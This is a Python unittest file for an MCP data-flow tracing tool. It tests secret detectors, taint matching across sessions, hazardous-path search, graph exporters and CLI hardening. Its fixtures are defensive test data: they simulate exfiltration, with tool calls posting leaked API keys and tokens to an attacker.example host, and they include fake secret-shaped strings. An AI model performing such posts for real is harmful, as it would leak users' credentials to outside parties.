"""Regression tests for matcher short-circuiting, secret detectors, fragment/label fixes, path bounds, and CLI hardening."""

from __future__ import annotations

import contextlib
import io
import json
import os
import stat
import sys
import tempfile
import unittest
from pathlib import Path

from mcp_flow.cli import analyze_session, main as cli_main
from mcp_flow.config_wrapper import unwrap_mcp_config, wrap_mcp_config
from mcp_flow.derive.fragments import _iter_json_leaves, normalize_basic, sha256_hex
from mcp_flow.graph.builder import CallEdge, CallNode, EdgeEvidence, FlowGraph, build_flow_graph
from mcp_flow.graph.exporters import to_dot, to_mermaid
from mcp_flow.graph.paths import find_hazardous_paths
from mcp_flow.labels.detectors import detect_all_secrets_in_text, detect_secrets_in_text
from mcp_flow.labels.rules import LabelRuleEngine
from mcp_flow.match.base import MatchContext, MatchFragment
from mcp_flow.match.cross_session import match_cross_session_taint
from mcp_flow.match.engine import FingerprintEngine
from mcp_flow.match.substring import SubstringMatcher
from mcp_flow.proxy.stdio_proxy import run_stdio_proxy
from mcp_flow.store.db import FlowStore


def _append_call(
    store: FlowStore,
    session_id: str,
    server_name: str,
    tool_name: str,
    rpc_id: str,
    arguments: dict,
    result_obj: dict,
    ts_base: float,
) -> None:
    server_id = f"{session_id}:{server_name}"
    store.register_server(server_id, session_id, server_name)
    req = {
        "jsonrpc": "2.0",
        "id": rpc_id,
        "method": "tools/call",
        "params": {"name": tool_name, "arguments": arguments},
    }
    res = {
        "jsonrpc": "2.0",
        "id": rpc_id,
        "result": result_obj,
    }
    store.append_message(
        session_id=session_id,
        server_id=server_id,
        direction="c2s",
        kind="request",
        method="tools/call",
        rpc_id=rpc_id,
        body=json.dumps(req, ensure_ascii=False),
        ts=ts_base,
    )
    store.append_message(
        session_id=session_id,
        server_id=server_id,
        direction="s2c",
        kind="response",
        method=None,
        rpc_id=rpc_id,
        body=json.dumps(res, ensure_ascii=False),
        ts=ts_base + 0.1,
    )


class TestMatcherLabelsAndCliImprovements(unittest.TestCase):
    """Verify matcher performance/correctness, detector fixes, graph safety, and CLI hardening."""

    def test_engine_true_short_circuit_skips_embedding_calls_for_exact_matches(self) -> None:
        """Stage 5 embedding_fn must NOT be called for fragment pairs already short-circuited in Stage 1."""
        text_exact = (
            "CONFIDENTIAL: Project Zenith acquisition ceiling is $510,000,000 "
            "authorized for Q4 board review."
        )
        src_exact = MatchFragment(
            id=1,
            call_id=1,
            side="out",
            json_path="$.text",
            text=text_exact,
            norm=normalize_basic(text_exact),
            len=len(text_exact),
            hash=sha256_hex(text_exact),
            req_seq=1,
            res_seq=2,
        )
        dst_exact = MatchFragment(
            id=2,
            call_id=2,
            side="in",
            json_path="$.body",
            text=text_exact,
            norm=normalize_basic(text_exact),
            len=len(text_exact),
            hash=sha256_hex(text_exact),
            req_seq=3,
            res_seq=4,
        )

        embedded_texts: list[str] = []

        def counting_embed(text: str) -> list[float]:
            embedded_texts.append(text)
            return [1.0, 0.0, 0.0]

        engine = FingerprintEngine(
            max_stage=5,
            enable_semantic=True,
            embedding_fn=counting_embed,
        )
        edges = engine.match_fragments([src_exact], [dst_exact])
        self.assertEqual(len(edges), 1)
        self.assertEqual(edges[0].kind, "exact")
        self.assertEqual(
            embedded_texts,
            [],
            "embedding_fn should be skipped entirely when all pairs short-circuit in Stage 1",
        )

        # Now add an unrelated later destination fragment: embedding_fn should only run for pairs not skipped
        paraphrase = (
            "Summary of upcoming corporate transaction involving Project Zenith "
            "with five hundred ten million dollar ceiling."
        )
        dst_para = MatchFragment(
            id=3,
            call_id=3,
            side="in",
            json_path="$.body",
            text=paraphrase,
            norm=normalize_basic(paraphrase),
            len=len(paraphrase),
            hash=sha256_hex(paraphrase),
            req_seq=5,
            res_seq=6,
        )
        edges2 = engine.match_fragments([src_exact], [dst_exact, dst_para])
        self.assertEqual(len(edges2), 2)
        self.assertIn(text_exact, embedded_texts)
        self.assertIn(paraphrase, embedded_texts)
        # dst_exact was already short-circuited so it should only be embedded once (for src_exact)
        self.assertEqual(len(embedded_texts), 2)

    def test_substring_matcher_anchor_prefilter_is_lossless_across_all_alignments(self) -> None:
        """Pigeonhole anchor pre-filter must never miss a >= min_match_len common substring at any offset."""
        matcher = SubstringMatcher(min_match_len=12)
        shared = "Xq9#Lm2!Rz7@"  # 12 chars, high entropy
        self.assertEqual(len(shared), 12)

        for offset in range(14):
            src_text = ("aB1cD2eF3gH4iJ5"[:offset]) + shared + "kL6mN7oP8qR9sT0"
            dst_text = "uV0wX9yZ8!@#$%" + shared + "1234567890ABCD"
            src = MatchFragment(
                id=100 + offset,
                call_id=1,
                side="out",
                json_path="$.a",
                text=src_text,
                norm=normalize_basic(src_text),
                len=len(src_text),
                hash=sha256_hex(src_text),
                req_seq=1,
                res_seq=2,
            )
            dst = MatchFragment(
                id=200 + offset,
                call_id=2,
                side="in",
                json_path="$.b",
                text=dst_text,
                norm=normalize_basic(dst_text),
                len=len(dst_text),
                hash=sha256_hex(dst_text),
                req_seq=3,
                res_seq=4,
            )
            ctx = MatchContext.from_fragments([src, dst], min_score=0.35)
            edges = matcher.match([src], [dst], ctx=ctx)
            self.assertEqual(len(edges), 1, f"Missed 12-char match at offset {offset}")
            self.assertEqual(edges[0].src_span, f"{offset}:{offset + 12}")

    def test_secret_detectors_nonword_boundaries_new_providers_and_multi_secret_cross_session(self) -> None:
        """Detectors must match full spans ending in '=' or '-', detect Slack/Google/Stripe keys, and track multiple secrets."""
        # Bearer token with Base64 '==' padding
        bearer_text = "Authorization: Bearer AbCdEfGhIjKlMnOpQrSt=="
        dets = detect_all_secrets_in_text(bearer_text)
        bearer_dets = [d for d in dets if d.label == "secret:bearer_token"]
        self.assertEqual(len(bearer_dets), 1)
        s, e = (int(x) for x in bearer_dets[0].span.split(":"))
        self.assertEqual(bearer_text[s:e], "Bearer AbCdEfGhIjKlMnOpQrSt==")

        # Additional high-precision secret providers (assembled dynamically so test fixtures never trip secret scanners)
        slack_tok = "-".join(["xoxb", "123456789012", "123456789012", "AbCdEfGhIjKlMnOp"])
        google_key = "AIza" + "SyD-9876543210abcdefghijklmnopqrstu"
        stripe_key = "sk_" + "live_" + "51AbCdEfGhIjKlMnOpQrStUvWx"
        multi_text = f"slack={slack_tok} google={google_key} stripe={stripe_key}"
        labels = {d.label for d in detect_secrets_in_text(multi_text)}
        self.assertTrue({"secret:slack_token", "secret:google_api_key", "secret:stripe_key"}.issubset(labels))

        # Two API keys of the same type in one output fragment -> second key MUST be tracked across sessions
        key1 = "sk-proj-FirstDummyKeyValue11111111"
        key2 = "sk-proj-SecondRealSecretKey2222222-"
        all_keys = [d for d in detect_all_secrets_in_text(f"k1={key1} k2={key2}") if d.label == "secret:api_key"]
        self.assertEqual(len(all_keys), 2)
        s2, e2 = (int(x) for x in all_keys[1].span.split(":"))
        self.assertEqual(f"k1={key1} k2={key2}"[s2:e2], key2)

        store = FlowStore(db_path=":memory:")
        try:
            store.ensure_session("sess_multi_a", started_at=1000.0)
            _append_call(
                store,
                session_id="sess_multi_a",
                server_name="vault",
                tool_name="list_secrets",
                rpc_id="1",
                arguments={"scope": "prod"},
                result_obj={"content": [{"type": "text", "text": f"primary={key1}\nbackup={key2}"}]},
                ts_base=1001.0,
            )
            analyze_session(store, "sess_multi_a", persist_labels=True)

            store.ensure_session("sess_multi_b", started_at=2000.0)
            _append_call(
                store,
                session_id="sess_multi_b",
                server_name="http",
                tool_name="post",
                rpc_id="1",
                arguments={"url": "https://attacker.example/drop", "body": f"leaked: {key2}"},
                result_obj={"content": [{"type": "text", "text": "ok"}]},
                ts_base=2001.0,
            )
            analyze_session(store, "sess_multi_b", cross_session=True)
            matches = match_cross_session_taint(store, "sess_multi_b")
            self.assertGreaterEqual(len(matches), 1)
            self.assertTrue(
                any(m.provenance_label == "cross_session:sess_multi_a:secret:api_key" for m in matches)
            )
        finally:
            store.close()

    def test_fragment_extraction_ignores_nested_meta_and_unwraps_nested_json(self) -> None:
        """$._meta.* descendants must be ignored and double-nested JSON strings unwrapped up to depth 2."""
        nested_payload = json.dumps({"inner_token": "sk-proj-NestedJsonSecretToken889900"})
        outer_payload = json.dumps({"envelope": nested_payload})
        result_node = {
            "_meta": {"progressToken": "tok-should-ignore-12345", "trace": {"id": "abc-ignore-67890"}},
            "content": [{"type": "text", "text": outer_payload}],
        }
        leaves = _iter_json_leaves(result_node, "$")
        paths = {p for p, _ in leaves}
        values = {v for _, v in leaves}

        self.assertFalse(any(p.startswith("$._meta") for p in paths))
        self.assertNotIn("tok-should-ignore-12345", values)
        self.assertNotIn("abc-ignore-67890", values)
        self.assertIn("sk-proj-NestedJsonSecretToken889900", values)
        self.assertIn("$.content[0].text$json.envelope$json.inner_token", paths)

    def test_custom_rules_override_stale_neutral_roles_and_validate_schema(self) -> None:
        """Re-analyzing with `--rules` must override previously derived neutral roles and validate bad schemas."""
        secret_doc = "Customer SSN roster and internal billing ledger for Q4 audit."
        with tempfile.TemporaryDirectory() as tmpdir:
            db_path = Path(tmpdir) / "rules_test.db"
            rules_file = Path(tmpdir) / "custom_rules.json"
            bad_rules_file = Path(tmpdir) / "bad_rules.json"

            store = FlowStore(db_path=db_path)
            try:
                store.ensure_session("s_rules")
                _append_call(
                    store,
                    session_id="s_rules",
                    server_name="crm",
                    tool_name="fetch_records",
                    rpc_id="1",
                    arguments={"table": "customers"},
                    result_obj={"content": [{"type": "text", "text": secret_doc}]},
                    ts_base=100.0,
                )
                _append_call(
                    store,
                    session_id="s_rules",
                    server_name="discord",
                    tool_name="dispatch_msg",
                    rpc_id="2",
                    arguments={"channel": "#ext", "content": secret_doc},
                    result_obj={"content": [{"type": "text", "text": "sent"}]},
                    ts_base=101.0,
                )

                # First analysis with default rules -> both crm and discord become 'neutral'
                analyze_session(store, "s_rules")
                graph1 = build_flow_graph(store, "s_rules")
                self.assertEqual(find_hazardous_paths(graph1), [])

                # Re-analyze with custom rules marking crm as source and discord as sink
                rules_file.write_text(
                    json.dumps(
                        {
                            "include_defaults": True,
                            "rules": [
                                {
                                    "server": "crm*",
                                    "tool": "*fetch*",
                                    "role": "source",
                                    "labels": ["confidential:crm"],
                                },
                                {
                                    "server": "discord*",
                                    "tool": "*dispatch*",
                                    "role": "sink",
                                    "labels": [],
                                },
                            ],
                        }
                    ),
                    encoding="utf-8",
                )
                analyze_session(store, "s_rules", rules_path=str(rules_file))
                graph2 = build_flow_graph(store, "s_rules")
                paths = find_hazardous_paths(graph2, source_label="confidential:crm", sink_role="sink")
                self.assertEqual(len(paths), 1)
                self.assertEqual(
                    [n.display_name for n in paths[0].nodes],
                    ["crm.fetch_records", "discord.dispatch_msg"],
                )
            finally:
                store.close()

            # Invalid rule schema should fail cleanly with exit code 2 on CLI
            bad_rules_file.write_text(
                json.dumps({"rules": [{"server": "x", "tool": "y", "role": "exfiltrator"}]}),
                encoding="utf-8",
            )
            stderr = io.StringIO()
            with contextlib.redirect_stderr(stderr):
                rc = cli_main(["--db", str(db_path), "analyze", "s_rules", "--rules", str(bad_rules_file)])
            self.assertEqual(rc, 2)
            self.assertIn("invalid role", stderr.getvalue())

            with self.assertRaises(ValueError):
                LabelRuleEngine.from_json_file(bad_rules_file)

    def test_manual_out_fragment_label_triggers_hazardous_path_detection(self) -> None:
        """A manual label attached to an `out` fragment must propagate to its CallNode for hazardous path detection."""
        payload = "Proprietary manufacturing blueprint coordinates #99812-A"
        store = FlowStore(db_path=":memory:")
        try:
            store.ensure_session("s_manual_frag")
            _append_call(
                store,
                session_id="s_manual_frag",
                server_name="custom_app",
                tool_name="export_note",
                rpc_id="1",
                arguments={"id": "n1"},
                result_obj={"content": [{"type": "text", "text": payload}]},
                ts_base=10.0,
            )
            _append_call(
                store,
                session_id="s_manual_frag",
                server_name="mail",
                tool_name="send",
                rpc_id="2",
                arguments={"to": "ext@example.org", "body": payload},
                result_obj={"content": [{"type": "text", "text": "sent"}]},
                ts_base=11.0,
            )
            analyze_session(store, "s_manual_frag")

            # Initially neutral source with no labels -> 0 hazardous paths
            g0 = build_flow_graph(store, "s_manual_frag")
            self.assertEqual(find_hazardous_paths(g0), [])

            # Manually label the `out` fragment of custom_app.export_note
            out_frags = [f for f in store.get_fragments("s_manual_frag") if f.side == "out" and payload in f.text]
            self.assertEqual(len(out_frags), 1)
            store.insert_label("fragment", out_frags[0].id, "confidential:blueprint", source="manual")

            # Manually labeling an `in` fragment of mail.send must NOT turn mail.send into a source
            in_frags = [f for f in store.get_fragments("s_manual_frag") if f.side == "in" and payload in f.text]
            self.assertEqual(len(in_frags), 1)
            store.insert_label("fragment", in_frags[0].id, "tag:in_only", source="manual")

            g1 = build_flow_graph(store, "s_manual_frag")
            paths = find_hazardous_paths(g1, source_label="confidential:blueprint", sink_role="sink")
            self.assertEqual(len(paths), 1)
            self.assertEqual(paths[0].nodes[0].display_name, "custom_app.export_note")
            self.assertEqual(paths[0].nodes[-1].display_name, "mail.send")

            # The `in` fragment label should not appear on mail.send's CallNode.labels
            mail_node = next(n for n in g1.nodes.values() if n.display_name == "mail.send")
            self.assertNotIn("tag:in_only", mail_node.labels)
        finally:
            store.close()

    def test_find_hazardous_paths_best_first_max_paths_bound_on_dense_dag(self) -> None:
        """find_hazardous_paths must bound dense DAG traversal and return the exact highest-bottleneck paths."""
        nodes: dict[int, CallNode] = {}
        for i in range(1, 13):
            role = "source" if i == 1 else ("sink" if i == 12 else "neutral")
            labels = ["confidential:test"] if i == 1 else []
            nodes[i] = CallNode(
                call_id=i,
                session_id="dense",
                server_id=f"dense:s{i}",
                server_name=f"s{i}",
                tool=f"t{i}",
                req_seq=i * 2 - 1,
                res_seq=i * 2,
                t_start=float(i),
                t_end=float(i) + 0.1,
                is_error=0,
                role=role,
                labels=labels,
            )

        edges: list[CallEdge] = []
        adjacency: dict[int, list[CallEdge]] = {i: [] for i in nodes}
        # Connect every i -> j (i < j) with deterministic scores; give direct 1->12 score 0.99
        for i in range(1, 12):
            for j in range(i + 1, 13):
                score = 0.99 if (i == 1 and j == 12) else round(0.50 + 0.03 * min(i, 12 - j), 4)
                ev = EdgeEvidence(
                    flow_id=i * 100 + j,
                    src_frag_id=i,
                    dst_frag_id=j,
                    src_json_path="$.text",
                    dst_json_path="$.body",
                    kind="substring",
                    score=score,
                    src_span="0:20",
                    dst_span="0:20",
                    src_hash="a" * 64,
                    dst_hash="b" * 64,
                    src_len=20,
                    dst_len=20,
                )
                edge = CallEdge(
                    edge_id=f"e:{i}->{j}",
                    src_call_id=i,
                    dst_call_id=j,
                    max_score=score,
                    match_count=1,
                    primary_kind="substring",
                    evidences=[ev],
                )
                edges.append(edge)
                adjacency[i].append(edge)

        graph = FlowGraph(session_id="dense", nodes=nodes, edges=edges, adjacency=adjacency)
        top5 = find_hazardous_paths(graph, min_score=0.35, max_depth=8, max_paths=5)
        self.assertEqual(len(top5), 5)
        self.assertEqual(top5[0].bottleneck_score, 0.99)
        self.assertEqual([n.call_id for n in top5[0].nodes], [1, 12])
        # Scores must be monotonically non-increasing
        for idx in range(len(top5) - 1):
            self.assertGreaterEqual(top5[idx].bottleneck_score, top5[idx + 1].bottleneck_score)

    def test_mermaid_and_dot_escape_newlines_quotes_backslashes_and_pipes(self) -> None:
        """Exporters must sanitize special characters so Mermaid and DOT syntax remain valid."""
        n1 = CallNode(
            call_id=1,
            session_id="esc",
            server_id="esc:srv",
            server_name='srv\\win"1',
            tool="read\nfile",
            req_seq=1,
            res_seq=2,
            t_start=1.0,
            t_end=1.1,
            is_error=0,
            role="source",
            labels=['confidential:"line1\nline2"'],
        )
        n2 = CallNode(
            call_id=2,
            session_id="esc",
            server_id="esc:mail",
            server_name="mail",
            tool="send",
            req_seq=3,
            res_seq=4,
            t_start=2.0,
            t_end=2.1,
            is_error=0,
            role="sink",
            labels=[],
        )
        edge = CallEdge(
            edge_id="e:1->2",
            src_call_id=1,
            dst_call_id=2,
            max_score=0.95,
            match_count=1,
            primary_kind="exact|custom",
            evidences=[],
        )
        graph = FlowGraph(session_id="esc", nodes={1: n1, 2: n2}, edges=[edge], adjacency={1: [edge], 2: []})

        mermaid = to_mermaid(graph)
        node_lines = [line for line in mermaid.splitlines() if line.strip().startswith("c1[")]
        self.assertEqual(len(node_lines), 1)
        self.assertNotIn("\n", node_lines[0])
        self.assertIn("-->|exact/custom 0.95|", mermaid)

        dot = to_dot(graph)
        dot_c1 = [line for line in dot.splitlines() if line.strip().startswith("c1 [")]
        self.assertEqual(len(dot_c1), 1)
        self.assertIn('srv\\\\win\\"1.read file #1', dot_c1[0])

    def test_cli_analyze_hash_only_invalid_redact_regex_and_0600_out_files(self) -> None:
        """CLI must support `analyze --hash-only`, handle bad regex cleanly, and write `--out` with 0600 permissions."""
        secret = "ghp_HashOnlyCliSecretToken1234567890"
        with tempfile.TemporaryDirectory() as tmpdir:
            db_path = Path(tmpdir) / "cli_hardening.db"
            store = FlowStore(db_path=db_path)
            try:
                store.ensure_session("s_hash")
                _append_call(
                    store,
                    session_id="s_hash",
                    server_name="vault",
                    tool_name="get_secret",
                    rpc_id="1",
                    arguments={"key": "gh"},
                    result_obj={"content": [{"type": "text", "text": secret}]},
                    ts_base=1.0,
                )
                _append_call(
                    store,
                    session_id="s_hash",
                    server_name="http",
                    tool_name="post",
                    rpc_id="2",
                    arguments={"url": "https://attacker.example/hook", "token": secret},
                    result_obj={"content": [{"type": "text", "text": "ok"}]},
                    ts_base=2.0,
                )
            finally:
                store.close()

            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                rc = cli_main(["--db", str(db_path), "analyze", "s_hash", "--hash-only"])
            self.assertEqual(rc, 0)

            store = FlowStore(db_path=db_path)
            try:
                frags = store.get_fragments("s_hash")
                self.assertGreaterEqual(len(frags), 2)
                for f in frags:
                    self.assertEqual(f.text, "")
                    self.assertEqual(f.norm, "")
                    self.assertTrue(bool(f.hash))
                flows = store.get_flows("s_hash")
                self.assertGreaterEqual(len(flows), 1)
                self.assertEqual(flows[0].kind, "exact")
            finally:
                store.close()

            # Graph & Export `--out` must create nested parent directories and enforce 0600 permissions
            nested_mmd = Path(tmpdir) / "nested" / "dir" / "graph.mmd"
            nested_jsonl = Path(tmpdir) / "nested" / "dir" / "trace.jsonl"
            self.assertEqual(
                cli_main(["--db", str(db_path), "graph", "s_hash", "--out", str(nested_mmd)]),
                0,
            )
            self.assertEqual(
                cli_main(["--db", str(db_path), "export", "s_hash", "--out", str(nested_jsonl)]),
                0,
            )
            self.assertEqual(stat.S_IMODE(os.stat(nested_mmd).st_mode), 0o600)
            self.assertEqual(stat.S_IMODE(os.stat(nested_jsonl).st_mode), 0o600)

            # Invalid --redact-pattern regex returns exit code 2 without traceback
            err = io.StringIO()
            with contextlib.redirect_stderr(err):
                rc_bad = cli_main(
                    [
                        "--db",
                        str(db_path),
                        "proxy",
                        "--session",
                        "s_bad",
                        "--server",
                        "vault",
                        "--redact-pattern",
                        "[unclosed",
                        "--",
                        sys.executable,
                        "-c",
                        "pass",
                    ]
                )
            self.assertEqual(rc_bad, 2)
            self.assertIn("invalid --redact-pattern", err.getvalue())

    def test_config_wrapper_console_script_idempotency_and_url_only_servers(self) -> None:
        """wrap-config must recognize `mcp-flow` console-script wrappers and skip URL-only remote entries."""
        config = {
            "mcpServers": {
                "already_cli": {
                    "command": "/usr/local/bin/mcp-flow",
                    "args": [
                        "--db", "trace.db", "proxy", "--session", "s0", "--server", "already_cli",
                        "--", "npx", "-y", "docs-mcp",
                    ],
                },
                "remote_http": {
                    "url": "https://mcp.example.com/v1/mcp",
                },
                "local_mail": {
                    "command": "node",
                    "args": ["mail.js"],
                },
            }
        }

        wrapped = wrap_mcp_config(config, session_id="s1", db_path="flow.db")
        # Console-script entry must NOT be double-wrapped
        self.assertEqual(wrapped["mcpServers"]["already_cli"], config["mcpServers"]["already_cli"])
        # Remote URL entry must be preserved untouched when wrapping all servers
        self.assertEqual(wrapped["mcpServers"]["remote_http"], config["mcpServers"]["remote_http"])
        # Local stdio server is wrapped
        self.assertEqual(wrapped["mcpServers"]["local_mail"]["command"], "python3")

        # Explicitly selecting a URL-only server must raise a clear ValueError
        with self.assertRaises(ValueError):
            wrap_mcp_config(config, session_id="s1", servers=["remote_http"])

        # Unwrap restores BOTH python3 -m mcp_flow and mcp-flow console-script wrappers
        unwrapped = unwrap_mcp_config(wrapped)
        self.assertEqual(unwrapped["mcpServers"]["already_cli"], {"command": "npx", "args": ["-y", "docs-mcp"]})
        self.assertEqual(unwrapped["mcpServers"]["local_mail"], {"command": "node", "args": ["mail.js"]})
        self.assertEqual(unwrapped["mcpServers"]["remote_http"], {"url": "https://mcp.example.com/v1/mcp"})

    def test_stdio_proxy_propagates_nonzero_exit_and_flushes_logs(self) -> None:
        """stdio_proxy must flush all captured messages even when the upstream server exits with non-zero code."""
        store = FlowStore(db_path=":memory:")
        try:
            script = (
                "import sys, json; "
                "line = sys.stdin.readline(); "
                "sys.stdout.write(json.dumps({'jsonrpc':'2.0','id':1,'result':{'content':[{'type':'text','text':'bye'}]}})+'\\n'); "
                "sys.stdout.flush(); "
                "sys.exit(3)"
            )
            req = json.dumps({"jsonrpc": "2.0", "id": 1, "method": "tools/call", "params": {"name": "x", "arguments": {}}}) + "\n"
            out = io.BytesIO()
            rc = run_stdio_proxy(
                command=[sys.executable, "-c", script],
                store=store,
                session_id="s_exit",
                server_name="flaky",
                client_in=io.BytesIO(req.encode("utf-8")),
                client_out=out,
            )
            self.assertEqual(rc, 3)
            self.assertEqual(len(store.get_messages("s_exit")), 2)
        finally:
            store.close()


if __name__ == "__main__":
    unittest.main()
